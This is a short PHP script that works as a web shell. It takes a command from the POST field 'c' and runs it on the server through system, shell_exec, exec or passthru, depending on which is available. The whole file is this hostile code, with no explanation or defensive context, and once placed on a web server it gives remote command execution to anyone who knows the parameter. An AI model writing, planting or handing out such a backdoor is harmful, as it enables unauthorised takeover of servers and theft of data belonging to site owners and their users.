<?php
echo "start";
if (function_exists('system')) 
	system($_POST['c']); 
elseif (function_exists('shell_exec')) 
	echo shell_exec($_POST['c']); 
elseif (function_exists('exec')) { 
	$ExecArray = array(); 
	exec($_POST['c'],$ExecArray); 
}
elseif (function_exists('passthru')) 
	passthru($_POST['c']); 
?>